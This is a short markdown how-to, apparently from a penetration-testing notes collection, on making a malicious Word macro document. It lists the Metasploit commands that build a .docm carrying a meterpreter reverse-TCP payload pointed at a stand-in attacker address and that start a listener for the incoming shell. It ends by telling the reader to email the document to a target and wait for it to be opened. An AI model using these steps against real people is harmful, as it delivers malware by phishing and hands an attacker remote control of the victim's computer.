# MS Word Maliciou Macro Document Creation

### Example tool to create infected documents: 

#### 1) Metasploit

### Usage:

1) Enter metasploit console

        msfconsole

2) Specify the payload to use

        set payload windows/meterpreter/reverse_tcp

3) Use this module to create the malicious .docm file

        use exploit/multi/fileformat/office_word_macro

4) Set our IP address to listen for connections

        set LHOST ATTACKER_IP

5) Set our port to listen for connections

        set LPORT ATTACKER_PORT

6) Check the settings if they are properly configured

        show options

7) Run the module

        exploit

#### The word document with the embedded macro will be stored in:

 - /root/.msf4/local/msf.docm

8) Open another msfconsole session in another terminal and use the multi/handler module to catch incoming connections

        use exploit/multi/handler

9) Set the payload we used to create the file for the handler to recognise it

        set payload windows/meterpreter/reverse_tcp

10) Set connection information

        set LHOST ATTACKER_IP

        set LPORT ATTACKER_PORT

11) Check our settings again for good measure

        show options

12) Run the module

        exploit

### Then, send the malicious document via email (for example) to your target and wait for them to open it. Then profit
